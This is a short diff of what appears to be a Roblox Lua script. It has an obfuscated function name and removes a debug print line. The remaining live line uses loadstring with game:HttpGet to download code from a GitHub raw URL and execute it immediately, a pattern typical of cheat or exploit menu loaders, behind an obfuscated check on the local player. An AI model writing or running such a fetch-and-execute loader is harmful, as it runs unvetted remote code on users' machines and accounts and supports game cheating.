@@ -18,6 +18,5 @@ local function XpLoSiOn_4lPhA_9tHeReXpLoSiOn_4tHeReXpLoSiOn_4lPhA_9tHeReXpLoSiOn
 end
 
 if XpLoSiOn_4lPhA_9tHeReXpLoSiOn_4tHeReXpLoSiOn_4lPhA_9tHeReXpLoSiOn_4tHeReXpLoSiOn_4lPhA_9tHeReXpLoSiOn_4tHeReXpLoSiOn_4lPhA_9tHeReXpLoSiOn_(game.Players.LocalPlayer) then
-    print("hi4")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/asdoiaeqp9/FullMenu/main/Menu"))()
 end
